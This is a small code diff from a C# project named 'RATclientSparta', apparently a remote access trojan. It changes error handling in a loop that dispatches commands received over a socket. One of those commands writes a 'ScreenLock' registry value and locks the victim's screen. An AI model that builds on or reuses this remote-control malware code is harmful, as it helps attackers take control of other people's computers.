@@ -110,7 +110,7 @@ namespace RATclientSparta.Server
                         case 24: RegistryCreate Item = new RegistryCreate(); Item.Create("ScreenLock", Encoding.ASCII.GetString(message)); screenBlock.CheckIfLockRequired(); break;
                     }
                 }
-                catch { }
+                catch { break; }
             }
             this.SocketConnection.Close();
             LostConnectionEvent.Invoke();
